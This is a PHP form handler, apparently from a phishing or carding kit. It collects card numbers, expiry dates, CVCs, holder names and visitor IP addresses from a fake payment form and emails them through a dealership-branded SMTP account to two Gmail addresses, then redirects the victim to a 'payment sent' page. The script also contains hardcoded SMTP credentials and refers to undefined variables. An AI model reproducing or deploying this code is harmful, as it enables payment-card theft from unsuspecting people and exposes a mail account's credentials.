<?php
// Include PHPMailer library
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;


require 'vendor/autoload.php';


// Get IP address
$ip_address = $_SERVER['REMOTE_ADDR'];
$Card1 = $_POST['Card1'];
$ex1 = $_POST['ex1'];
$ex2 = $_POST['ex2'];
$cvc = $_POST['cvc'];
$holder = $_POST['holder'];


$mail = new PHPMailer(true); // create a PHPMailer object

try {
    //Server settings
    $mail->SMTPDebug = 0;                                       // Enable verbose debug output
    $mail->isSMTP();                                            // Set mailer to use SMTP
    $mail->Host       = 'mail.revoltbikedealership.com';    // Specify main and backup SMTP servers
    $mail->SMTPAuth   = true;                                   // Enable SMTP authentication
    $mail->Username   = 'contact@revoltbikedealership.com'; // SMTP username
    $mail->Password   = 'Kumar@4823';                            // SMTP password
    $mail->SMTPSecure = 'ssl';                                  // Enable TLS encryption, `ssl` also accepted
    $mail->Port       = 465;                                    // TCP port to connect to

    //Recipients
    $mail->setFrom('contact@revoltbikedealership.com');        // Put the Email same as Above
    $mail->addAddress('businessbaba88@gmail.com');                // Add a recipient
    $mail->addAddress('viveknathsharma252@gmail.com');            // Add a second recipient

    // Content
    $mail->isHTML(true);
    $mail->Subject = 'Welcome to ' . $ip_address . ' Payment ' . $banks . ' ';
    $mail->Body = "A new record has been added to the database with the following information:<br><br>
                    <h2>Card No: $Card1 <br></h2>
                    <h2> Expire Date: ".$ex1."".$ex2."<br> </h2>
                    <h2> CVC: $cvc</h2>
					<h2> Card Holder Name: $holder</h2>
			
                    <h2>IP address: $ip_address</h2>";


					//$ip_address = $_SERVER['REMOTE_ADDR'];
   
    $mail->send();
    header("Location: payment_send.html");
    exit;
} catch (Exception $e) {
    echo 'Email could not be sent. Error: ', $mail->ErrorInfo;
}

// Close database connection
$conn->close();
?>
